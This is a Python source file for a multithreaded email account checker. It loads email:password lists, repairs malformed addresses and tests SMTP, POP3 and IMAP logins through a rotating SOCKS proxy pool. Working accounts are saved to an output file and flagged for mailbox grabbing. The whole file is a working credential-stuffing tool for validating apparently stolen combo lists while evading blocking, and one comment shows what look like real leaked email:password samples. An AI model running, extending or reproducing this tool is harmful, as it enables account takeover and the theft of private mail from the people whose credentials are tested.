# checking accs only frm ISPDB variants
import socket, requests, time, datetime, threading
import concurrent.futures

from includes.SMTPSocks import MYSMTP, MYSMTP_SSL
from includes.IMAP4Socks import MYIMAP4, MYIMAP4_SSL
from includes.POP3Socks import MYPOP3, MYPOP3_SSL
from includes.ProtocolErrors import retry_list, socket_errors, auth_error_list, wrong_ssl_list
import includes.Database as db

from includes.RootLogger import rootLogger
from includes.MailGrabberClass import WEBMailProcessor


# TODO: remove import as useless
import random
import ssl
import re

import os
from os.path import join, dirname
from dotenv import load_dotenv
import redis

import sys
from io import open
import json

valid_email_re = re.compile("[\w\-\_\.]+(\@|(\%40))[\w\-\_]+(\.[\w\-\_]{2,10}){1,3}", re.IGNORECASE | re.MULTILINE)

bad_email_re = re.compile("\.([\w-])?\.", re.IGNORECASE | re.MULTILINE)
# Create .env file path.
# dotenv_path = "/app/includes/.env"
dotenv_path = join(dirname(__file__), 'includes/.env')
# Load file from the path.
load_dotenv(dotenv_path)
# create redis instance
env_host = os.getenv('REDIS_HOST')
env_port = int(os.getenv('REDIS_PORT'))
env_password = os.getenv('REDIS_PASSWORD') if os.getenv('REDIS_PASSWORD') != 'null' else None
env_decode_responses = True if os.getenv('REDIS_DECODERESPONSES') == 'True' else False
env_max_connections = 128 # enough for current tasks

# Use a thread-safe blocking connection pool.
redis_conn_pool = redis.BlockingConnectionPool(
    host=env_host,
    port=env_port,
    max_connections=env_max_connections,
    decode_responses=env_decode_responses,
    timeout=300,
)

# hardcoded port instead of regular
web_acc_proxy_port = 27471

# get socks, make some changes
def getSocksList(socks):
    db_socks = db.getSocks(socks_type="checker", row_as_dict=True, alive_only=True, allow_smtp_only=True, enabled_only=True)
    # mark all processes are zero
    for item in db_socks:
        item['processes'] = 0
        # try to get proxy from original list
        proxy = next( (old_item for old_item in socks if old_item['id'] == item['id']), None)
        if proxy is not None:
            item['processes'] = proxy['processes']

    return db_socks

def provideSock(socks=[], blacklist=[], settings={}, web_acc=False):
    proxy = None
    # if len(socks):
    #     proxy = socks[0]

    # TODO: sort it in a pythonic way
    for sock in sorted(socks, key=lambda k: k['processes'], reverse=False):
        if sock['processes'] < int(settings['process_per_proxy']) and sock['id'] not in blacklist:
            # rootLogger.info(f"provideSock: sock[{sock['id']}] with {sock['processes']} processes")
            sock['processes'] += 1
            proxy = sock
            break

    return proxy

def freeSock(thread, socks):
    # remove process from proxy
    for sock in socks:
        if sock['id'] == thread.sock_data['id'] and sock['processes'] > 0:
            # rootLogger.info(f"freeSock:{thread.prefix} found socket, processes:{sock['processes']}")
            sock['processes'] -= 1

    return socks

def check_smtp(sock_data, account=None, mail_host='', mail_port=0, mail_user='', mail_password='', mail_ssl=False, mail_starttls=False):
    result = 0
    error = None

    if account is not None:
        if len(mail_host) < 1:
            mail_host = account.smtp_host
        if mail_port == 0:
            mail_port = account.smtp_port
        if len(mail_user) < 1:
            mail_user = account.smtp_login
        if len(mail_password) < 1:
            mail_password = account.smtp_password

    # if nothing to check, just quit
    if not mail_host or mail_port == 0 or not mail_user or not mail_password:
        return result, error

    socks_creds = {
        'host': sock_data['host'],
        'port': int(sock_data['port']),
        'user': sock_data['login'],
        'password': sock_data['password']
    }

    result = 0
    # atttempt = f"Account[{account.id}] SMTP check {mail_user}:{mail_password[0:2]}***@{mail_host}:{mail_port} ssl:{mail_ssl} stls:{mail_starttls} via {sock_data['host']}:{sock_data['port']}"
    atttempt = f"Account[{account.id}] SMTP check {mail_host}:{mail_port} ssl:{mail_ssl} stls:{mail_starttls} via {sock_data['host']}:{sock_data['port']}"
    try:
        # if mail_port == 465 or account.smtp_ssl > 0:
        if account.smtp_ssl > 0 or mail_ssl:
            context=ssl.create_default_context()
            server = MYSMTP_SSL(host=mail_host,
                            port=mail_port,
                            local_hostname=None,
                            timeout=60,
                            socks_creds=socks_creds,
                            context=context)
        else:
            server = MYSMTP(host=mail_host,
                            port=mail_port,
                            local_hostname=None,
                            timeout=60,
                            socks_creds=socks_creds)

        server.connect(mail_host, mail_port)

        if mail_starttls:
            server.starttls()

        server.ehlo_or_helo_if_needed()
        server.login(mail_user, mail_password)
        server.quit()
        rootLogger.info(f"{atttempt} is ok")
        result = 1
    except Exception as e:
        rootLogger.info(f"{atttempt} is not ok: {e}")
        # raise e
        result = 0
        error = str(e)

    return result, error

def check_smtp_all(sock_data, account, my_redis=None, max_threads=5):
    res = {
        'smtp_host': account.smtp_host,
        'smtp_port': account.smtp_port,
        'smtp_login': account.smtp_login,
        'smtp_password': account.smtp_password,
        'smtp_ssl': 0,
        'smtp_alive': 0
    }
    error = None

    variants = []

    mail_user = account.smtp_login
    mail_password = account.smtp_password

    hosts = [account.smtp_host, account.pop3_host, account.imap_host]
    logins = [account.smtp_login, account.pop3_login, account.imap_login]
    passwords = [account.smtp_password, account.pop3_password, account.imap_password]

    # get first non-empty variant
    mail_user = next((item for item in logins if len(item) > 0), None)
    mail_password = next((item for item in passwords if len(item) > 0), None)

    # check if first timer but has all necesseary data
    # with help of redis hosts try to get proper settings for current record
    spl = re.split('[\@\#\%]', mail_user)
    check_host = spl[-1]
    # rootLogger.info(f"Account[{account.id}] SMTP ispdb check active ({check_host})")

    ispdb = db.getDomainData(check_host, my_redis)
    if ispdb and 'smtp' in ispdb:
        variants = [(item['host'], item['port'], True if item['socketType'] == 'SSL' else False, True if item['socketType'] == 'STARTTLS' else False) for item in ispdb['smtp']]

    # if no variants found in ipsdb or account was
    if len(variants) < 1:
        error = f"Account[{account.id}] SMTP ispdb not found"
        return res, error

    rootLogger.info(f"Account[{account.id}] SMTP, generated combos:{len(variants)}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        my_futures = { executor.submit(check_smtp, sock_data, account, variant[0], variant[1], mail_user, mail_password ,variant[2], variant[3]): variant for variant in variants }

        # save data ASAP
        for future in concurrent.futures.as_completed(my_futures):
            variant = my_futures[future]
            alive, variant_error = future.result()

            if alive == 1:
                rootLogger.info(f"Account[{account.id}] SMTP, got success combo:{variant}")
                res.update({
                    'smtp_host': variant[0],
                    'smtp_port': variant[1],
                    'smtp_login': mail_user,
                    'smtp_password': mail_password,
                    'smtp_ssl': int(variant[2]),
                    'smtp_alive': alive,
                    'smtp_starttls': int(variant[3])
                })

                error = None
            elif res['smtp_alive'] == 0:
                # try to save any interesting data, according to combos
                if variant_error is not None:
                    error = f"{variant_error}"
                    # if auth error - stop any other processings
                    for err_tpl in auth_error_list:
                        if err_tpl in variant_error.lower():
                            rootLogger.info(f"Account[{account.id}] SMTP found auth error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

                    for err_tpl in wrong_ssl_list:
                        if err_tpl.lower() in variant_error.lower():
                            rootLogger.info(f"Account[{account.id}] SMTP found ssl error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

    return res, error

def check_pop3(sock_data, account=None, mail_host='', mail_port=0, mail_user='', mail_password='', mail_ssl=False):
    result = 0
    error = None

    # mail account object has less priority over regular values
    if account is not None:
        if len(mail_host) < 1:
            mail_host = account.pop3_host
        if mail_port == 0:
            mail_port = account.pop3_port
        if len(mail_user) < 1:
            mail_user = account.pop3_login
        if len(mail_password) < 1:
            mail_password = account.pop3_password

    # if nothing to check, just quit
    if not mail_host or mail_port == 0 or not mail_user or not mail_password:
        return result, error

    socks_creds = {
        'host': sock_data['host'],
        'port': int(sock_data['port']),
        'user': sock_data['login'],
        'password': sock_data['password']
    }

    # atttempt = f"Account[{account.id}] POP3 check {mail_user}:{mail_password[0:2]}***@{mail_host}:{mail_port} ssl:{mail_ssl} via {sock_data['host']}:{sock_data['port']}"
    atttempt = f"Account[{account.id}] POP3 check {mail_host}:{mail_port} ssl:{mail_ssl} via {sock_data['host']}:{sock_data['port']}"
    try:
        # if mail_port == 995 or account.pop3_ssl > 0 or mail_ssl:
        if account.pop3_ssl > 0 or mail_ssl:
            server = MYPOP3_SSL(host=mail_host,
                            port=mail_port,
                            timeout=60,
                            socks_creds=socks_creds)
        else:
            server = MYPOP3(host=mail_host,
                            port=mail_port,
                            timeout=60,
                            socks_creds=socks_creds)

        server.user(mail_user)
        server.pass_(mail_password)
        # server.getwelcome()
        data = server.stat()
        data = server.quit()

        rootLogger.info(f"{atttempt} is ok")
        result = 1
    except Exception as e:
        rootLogger.error(f"{atttempt} is not ok: {e}")
        # raise e
        result = 0
        error = str(e)

    return result, error

def check_pop3_all(sock_data, account, my_redis, max_threads=5):
    res = {
        'pop3_host': account.pop3_host,
        'pop3_port': account.pop3_port,
        'pop3_login': account.pop3_login,
        'pop3_password': account.pop3_password,
        'pop3_ssl': 0,
        'pop3_alive': 0
    }
    error = None

    variants = []

    mail_user = account.smtp_login
    mail_password = account.smtp_password

    hosts = [account.smtp_host, account.pop3_host, account.imap_host]
    logins = [account.smtp_login, account.pop3_login, account.imap_login]
    passwords = [account.smtp_password, account.pop3_password, account.imap_password]

    # get first non-empty variant
    mail_user = next((item for item in logins if len(item) > 0), None)
    mail_password = next((item for item in passwords if len(item) > 0), None)

    # check if first timer but has all necesseary data
    # with help of redis hosts try to get proper settings for current record
    spl = re.split('[\@\#\%]', mail_user)
    check_host = spl[-1]
    # rootLogger.info(f"Account[{account.id}] POP3 ispdb check active ({check_host})")

    ispdb = db.getDomainData(check_host, my_redis)
    if ispdb and 'pop3' in ispdb:
        variants = [(item['host'], item['port'], True if item['socketType'] == 'SSL' else False) for item in ispdb['pop3']]

    if len(variants) < 1:
        error = f"Account[{account.id}] POP3 ispdb not found"
        return res, error

    # this variant generates over 9000 parallel tasks, attempting to execute 'em...
    rootLogger.info(f"Account[{account.id}] POP3, generated combos:{len(variants)}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        my_futures = { executor.submit(check_pop3, sock_data, account, variant[0], variant[1], mail_user, mail_password, variant[2]): variant for variant in variants }

        # save data ASAP
        for future in concurrent.futures.as_completed(my_futures):
            variant = my_futures[future]
            alive, variant_error = future.result()

            if alive == 1:
                rootLogger.info(f"Account[{account.id}] POP3, got success combo:{variant}")
                res.update({
                    'pop3_host': variant[0],
                    'pop3_port': variant[1],
                    'pop3_login': mail_user,
                    'pop3_password': mail_password,
                    'pop3_ssl': int(variant[2]),
                    'pop3_alive': alive,
                })

                error = None
            elif res['pop3_alive'] == 0:
                # try to save any interesting data, according to combos
                if variant_error is not None:
                    error = f"{variant_error}"
                    # if auth error - stop any other processings
                    for err_tpl in auth_error_list:
                        if err_tpl in variant_error.lower():
                            # rootLogger.info(f"Account[{account.id}] POP3 found auth error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

                    for err_tpl in wrong_ssl_list:
                        if err_tpl.lower() in variant_error.lower():
                            # rootLogger.info(f"Account[{account.id}] POP3 found ssl error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

    return res, error

def check_imap(sock_data, account=None, mail_host='', mail_port=0, mail_user='', mail_password='', mail_ssl=False):
    result = 0
    error = None

    # mail account object has less priority over regular values
    if account is not None:
        if len(mail_host) < 1:
            mail_host = account.imap_host
        if mail_port == 0:
            mail_port = account.imap_port
        if len(mail_user) < 1:
            mail_user = account.imap_login
        if len(mail_password) < 1:
            mail_password = account.imap_password

    # if nothing to check, just quit
    if not mail_host or mail_port == 0 or not mail_user or not mail_password:
        return result, error

    socks_creds = {
        'host': sock_data['host'],
        'port': int(sock_data['port']),
        'user': sock_data['login'],
        'password': sock_data['password']
    }

    # atttempt = f"Account[{account.id}] IMAP check {mail_user}:{mail_password[0:2]}***@{mail_host}:{mail_port} ssl:{mail_ssl} via {sock_data['host']}:{sock_data['port']}"
    atttempt = f"Account[{account.id}] IMAP check {mail_host}:{mail_port} ssl:{mail_ssl} via {sock_data['host']}:{sock_data['port']}"
    try:
        # if mail_port == 993 or account.imap_ssl > 0:
        if account.imap_ssl > 0 or mail_ssl:
            server = MYIMAP4_SSL(host=mail_host,
                            port=mail_port,
                            # timeout=60,
                            socks_creds=socks_creds)
        else:
            server = MYIMAP4(host=mail_host,
                            port=mail_port,
                            # timeout=60,
                            socks_creds=socks_creds)

        server.login(mail_user, mail_password)
        server.select('INBOX')
        server.logout()

        rootLogger.info(f"{atttempt} is ok")
        result = 1
    except Exception as e:
        rootLogger.error(f"{atttempt} is not ok: {e}")
        # raise e
        result = 0
        error = str(e)

    return result, error

def check_imap_all(sock_data, account, my_redis=None, max_threads=5):
    res = {
        'imap_host': account.imap_host,
        'imap_port': account.imap_port,
        'imap_login': account.imap_login,
        'imap_password': account.imap_password,
        'imap_ssl': 0,
        'imap_alive': 0
    }
    error = None

    variants = []

    mail_user = account.smtp_login
    mail_password = account.smtp_password

    hosts = [account.smtp_host, account.pop3_host, account.imap_host]
    logins = [account.smtp_login, account.pop3_login, account.imap_login]
    passwords = [account.smtp_password, account.pop3_password, account.imap_password]


    # get first non-empty variant
    mail_user = next((item for item in logins if len(item) > 0), None)
    mail_password = next((item for item in passwords if len(item) > 0), None)

    # check if first timer but has all necesseary data
    # with help of redis hosts try to get proper settings for current record
    spl = re.split('[\@\#\%]', mail_user)
    check_host = spl[-1]
    # rootLogger.info(f"Account[{account.id}] IMAP ispdb check active ({check_host})")

    ispdb = db.getDomainData(check_host, my_redis)
    if ispdb and 'imap' in ispdb:
        variants = [(item['host'], item['port'], True if item['socketType'] == 'SSL' else False) for item in ispdb['imap']]

    if len(variants) < 1:
        error = f"Account[{account.id}] IMAP ispdb not found"
        return res, error

    # this variant generates over 9000 parallel tasks, attempting to execute 'em...
    rootLogger.info(f"Account[{account.id}] IMAP, generated combos:{len(variants)}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        my_futures = { executor.submit(check_imap, sock_data, account, variant[0], variant[1], mail_user, mail_password ,variant[2]): variant for variant in variants }

        # save data ASAP
        for future in concurrent.futures.as_completed(my_futures):
            variant = my_futures[future]
            alive, variant_error = future.result()

            if alive == 1:
                rootLogger.info(f"Account[{account.id}] IMAP, got success combo:{variant}")
                res.update({
                    'imap_host': variant[0],
                    'imap_port': variant[1],
                    'imap_login': mail_user,
                    'imap_password': mail_password,
                    'imap_ssl': int(variant[2]),
                    'imap_alive': alive,
                })

                error = None
            elif res['imap_alive'] == 0:
                # try to save any interesting data, according to combos
                if variant_error is not None:
                    error = f"{variant_error}"
                    # if auth error - stop any other processings
                    for err_tpl in auth_error_list:
                        if err_tpl in variant_error.lower():
                            rootLogger.info(f"Account[{account.id}] IMAP found auth error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

                    for err_tpl in wrong_ssl_list:
                        if err_tpl.lower() in variant_error.lower():
                            rootLogger.info(f"Account[{account.id}] IMAP found ssl error, mark it as error")
                            # assign error
                            error = f"{variant_error}"
                            break

    return res, error

class AccCheckThread(threading.Thread):
    def __init__(self, account, sock_data, prefix='', blacklist=[], my_redis=None, max_threads=5):
        self.account = account
        self.sock_data = sock_data
        self.prefix = prefix
        self.blacklist = blacklist
        self.my_redis = my_redis
        self.max_threads = max_threads

        self.result = {
            '_id': account.id,
            'smtp_host': account.smtp_host,
            'smtp_port': account.smtp_port,
            'smtp_login': account.smtp_login,
            'smtp_password': account.smtp_password,
            'smtp_ssl': account.smtp_ssl,
            'smtp_starttls': account.smtp_starttls,
            'smtp_alive': 0,

            'pop3_host': account.pop3_host,
            'pop3_port': account.pop3_port,
            'pop3_login': account.pop3_login,
            'pop3_password': account.pop3_password,
            'pop3_ssl': account.pop3_ssl,
            'pop3_alive': 0,

            'imap_host': account.imap_host,
            'imap_port': account.imap_port,
            'imap_login': account.imap_login,
            'imap_password': account.imap_password,
            'imap_ssl': account.imap_ssl,
            'imap_alive': 0,

            'web_alive': 0,
            'alive': 0,
            'has_errors': 0,
            'error_log': {},
            'error_at': None,

            'need_grab_emails': 2 if account.need_grab_emails == 0 else account.need_grab_emails,
            'enabled': account.enabled

        }

        self.started_at = None
        # startt regular
        threading.Thread.__init__(self)

    def run(self):
        self.started_at = datetime.datetime.utcnow()
        # rootLogger.info(f"Account[{self.prefix}] Begin check")
        # time.sleep(random.randrange(5, 15))

        # if regular account, check for all protocols
        # TODO: what is better subthreads or just check one by one them all
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            my_futures = {
                executor.submit(check_smtp_all, self.sock_data, self.account, self.my_redis, self.max_threads): 'smtp',
                executor.submit(check_pop3_all, self.sock_data, self.account, self.my_redis, self.max_threads): 'pop3',
                executor.submit(check_imap_all, self.sock_data, self.account, self.my_redis, self.max_threads): 'imap',
            }

            # save data ASAP
            for future in concurrent.futures.as_completed(my_futures):
                key = my_futures[future]
                result, error = future.result()
                self.result.update(result)
                if error:
                    self.result['error_log'][key.upper()] = error
                    self.result.update({
                        'has_errors': 1,
                        'error_at': datetime.datetime.utcnow()
                    })

                # rootLogger.info(f"Account[{self.prefix}] {key.upper()} result: {result}, error:{error}")

        # calculate comon alive
        if self.result['smtp_alive'] > 0 and self.result['pop3_alive'] + self.result['imap_alive'] > 0:
            self.result['alive'] = 1
            # mark as normal
            self.result['has_errors'] = 0
            self.result['error_log'] = {}
            self.result['error_at'] = None
            self.result['enabled'] = 1
        else:
            # remove grabbing flag
            self.result['need_grab_emails'] = 2
            self.result['enabled'] = 0

        # done
        return True

    def getResult(self):
        return self.result

def addThread(threads, account, proxy, max_threads, my_redis=None):
    if proxy:
        new_thread = AccCheckThread(account, proxy, prefix=f"{account.id}", max_threads=max_threads, my_redis=my_redis)
        new_thread.daemon = True
        new_thread.start()
        threads.append( new_thread )
    else:
        rootLogger.info("No free proxy to add worker")

    return threads

def saveResults(results, out_fname):
    with open( out_fname , "a") as out_file:
        for result in results:
            # out_file.write(f"{json.dumps(result)}\n")
            if result['alive'] == 1:
                out_file.write(f"{result}\n")
            #     save_line = f"smtp://{result['smtp_login']}:{result['smtp_password']}@{result['smtp_host']}:{result['smtp_port']}"

            #     if result['imap_alive'] == 1:
            #         save_line += f" imap://{result['imap_login']}:{result['imap_password']}@{result['imap_host']}:{result['imap_port']}"

            #     elif result['pop3_alive'] == 1:
            #         save_line += f" pop3://{result['pop3_login']}:{result['pop3_password']}@{result['pop3_host']}:{result['pop3_port']}"

            #     out_file.write(f"{save_line}\n")

class MailAccount(object):
    # id = None
    smtp_host = None
    smtp_port = 0
    smtp_login = None
    smtp_password = None
    smtp_ssl = 0
    smtp_starttls = None
    smtp_alive = 0

    pop3_host = None
    pop3_port = 0
    pop3_login = None
    pop3_password = None
    pop3_ssl = 0
    pop3_alive = 0

    imap_host = None
    imap_port = 0
    imap_login = None
    imap_password = None
    imap_ssl = 0
    imap_alive = 0

    web_alive = 0
    alive = 0
    has_errors = 0
    error_log = {}
    error_at = None

    need_grab_emails = 2
    enabled = None

    def __init__(self, email, password):
        self.id = f"{email}"

        self.smtp_host = email
        self.imap_host = email
        self.pop3_host = email

        self.smtp_login = email
        self.imap_login = email
        self.pop3_login = email

        self.smtp_password = password
        self.imap_password = password
        self.pop3_password = password

def makeAccount(account_str):
    # make some host processing for tcaliche24@hotmai..com:bogota and islandbiatch@hotmai.l.com:ajustin

    # split by @
    spl = re.split('[\@\#\%]', account_str)
    check_host = spl[-1]
    check_host = check_host.split(':')[0]
    orig_host = f"---{check_host}"

    my_match = re.search(bad_email_re, check_host)

    while my_match:
        # rootLogger.info(f"Found bad email host in:{check_host}")
        check_host = check_host.replace( my_match.group(0), my_match.group(0)[1:] )
        # rootLogger.info(f"Processed bad email host into:{check_host}")
        my_match = re.search(bad_email_re, check_host)

    orig_host = orig_host.replace('---', '')

    account_str = account_str.replace(orig_host, check_host)

    email = None
    password = None
    emails = re.search( valid_email_re, account_str )
    if emails:
        email = emails.group(0)

    # all the resi is password
    password = account_str.replace(f"{email}:", '')

    if email is None:
        rootLogger.error(f"Can't extract email from:{account_str}")

    return MailAccount(email, password)


# run main function
if __name__ == '__main__':
    # check input file as well as output file
    if len(sys.argv) < 3:
        sys.exit("Example: python " + sys.argv[0] + " input_file output_file")

    start_time = time.time()
    rootLogger.info(f"Begin")

    in_fname = sys.argv[1] #
    out_fname = sys.argv[2]

    accounts = []
    with open( in_fname , "r") as in_file:
        accounts_raw = in_file.read().splitlines()
        accounts = [makeAccount(account_str) for account_str in accounts_raw if len(account_str)]

    # filter accounts
    accounts = [account for account in accounts if account.smtp_login]

    rootLogger.info(f"Total acocunts:{len(accounts)}")

    # create redis instance to share among all futher processes
    my_redis = redis.Redis(connection_pool=redis_conn_pool, decode_responses=env_decode_responses)

    # matches = 0
    # for account in accounts:
    #     if len(account.smtp_login) > 0:
    #         spl = re.split('[\@\#\%]', account.smtp_login)
    #         check_host = spl[-1]
    #         ispdb = db.getDomainData(check_host, my_redis)

    #         if ispdb:
    #             # rootLogger.info(f"{check_host} found match")
    #             matches += 1
    #         # else:
    #         #     rootLogger.error(f"{check_host} no match")


    # rootLogger.info(f"Total ispdb acocunts:{matches}")

    # spl = re.split('[\@\#\%]', mail_user)
    # check_host = spl[-1]

    # ispdb = db.getDomainData(check_host, my_redis)

    # sys.exit(0)

    # socks check interval
    sci = 300
    last_check = int(time.time())

    # get all socks for checking
    socks = getSocksList([])

    # get system settings
    settings = db.getSystemSettings()['acc_checker']
    rootLogger.info(f"System settings: {settings}")

    # calculate chunk size
    chunk_size = min(int(settings['number_process']), len(socks)*int(settings['process_per_proxy']))
    rootLogger.info(f"Calculated chunk size: {chunk_size} from {int(settings['number_process'])} and {len(socks)*int(settings['process_per_proxy'])}")

    # get all accounts for checking
    # accounts = db.getCheckAccounts(hours_delta=int(settings['min_hours']))
    # rootLogger.info(f"Accounts:{accounts}")

    # create main event loop
    threads = []
    rootLogger.info("Enter main loop")

    alive_tick = int(time.time())

    threads = []

    while True:
        results = []

        # check some values
        now = int(time.time())
        if now - last_check > sci:
            rootLogger.info("Time to get system settings")
            settings = db.getSystemSettings()['acc_checker']
            socks = getSocksList(socks)
            chunk_size = min(int(settings['number_process']), len(socks)*int(settings['process_per_proxy']))
            last_check = int(time.time())

        # check results for all threads
        for idx, thread in enumerate( threads ):
            if not thread.isAlive():
                result = thread.getResult()

                if result['error_at'] is None:
                    rootLogger.info(f"Thread[{thread.prefix}] done, get result: {result}")
                # else:
                    # if 'SMTP' in result['error_log']:
                    #     rootLogger.info(f"Thread[{thread.prefix}] done, get error: {result['error_log']['SMTP']}")
                    # else:
                    #     rootLogger.info(f"Thread[{thread.prefix}] done, get error: {result['error_log']}")

                threads.pop(idx)
                socks = freeSock(thread, socks)

                # process socket errors:
                if bool(result['error_log']):
                    # check if socket related error, then restart thread but add this sock into blacklists
                    for proto, error in result['error_log'].items():
                        for err_varinat in socket_errors:
                            if err_varinat in error:
                                rootLogger.info(f"Thread[{thread.prefix}] got socket error:'{error}'. Try re-assign task with another proxy.")
                                blacklist = thread.blacklist
                                blacklist.append( thread.sock_data['id'] )

                                socks = freeSock(thread, socks)
                                proxy = provideSock(socks, blacklist, settings)

                                if proxy:
                                    rootLogger.info(f"Re-Add worker[{thread.prefix}] to list with new proxy")

                                threads = addThread(threads, thread.account, proxy, int(settings['threads_per_protocol']), my_redis=my_redis)
                                # skip processing thread as resulting
                                continue

                # convert error_log to string
                error_str = ''
                for key, value in result['error_log'].items():
                    error_str += f'{key.upper()}: {value}\r\n'
                result['error_log'] = error_str

                results.append(result)

        # add new threads if possible
        if len(threads) < chunk_size:
            # rootLogger.info(f"Threads[{len(threads)}] are less than chunk[{chunk_size}]")
            # rootLogger.info(f"So proxies are:")
            while len(threads) < chunk_size:
                try:
                    # account = accounts.next()
                    account = accounts.pop()
                    # rootLogger.info(f"Get next account: {account.id}")
                    proxy = provideSock(socks, ['pseudo-blacklist'], settings)
                    if proxy is None:
                        rootLogger.info(f"No proxy to provide: {account.id}")
                        break
                    # rootLogger.info(f"Provided proxy{proxy['id']}: from {socks}")
                    threads = addThread(threads, account, proxy, int(settings['threads_per_protocol']), my_redis=my_redis)
                    # rootLogger.info(f"Threads amount:{len(threads)}")
                except Exception as e:
                    # rootLogger.info(f"But no more account to check:{e}")
                    account = None
                    break

        # update database with account check result
        if len(results):
            saveResults(results, out_fname)
            # db.setCheckAccounts(results)

        # if no accounts to add and no more active threads, quit loop
        if len(threads) == 0:
            rootLogger.info("Exit main loop")
            break

        if now - alive_tick > 120:
            rootLogger.info(f"Still running, total threads {len(threads)} while chunk_size is {chunk_size}")
            alive_tick = int(time.time())

        # sleep a while to avoid too less data to update
        time.sleep(0.25)
        # rootLogger.info(f"Time compare:{now} and {alive_tick}: {now - alive_tick}")

    # calculate time
    end_time = time.time()
    time_delta = end_time - start_time
    rootLogger.info(f"All processes are finnished, processing done tasks in {datetime.timedelta(seconds=time_delta)}")

    # sleep for 5 minutes
    five_min = 300
    time.sleep(five_min)
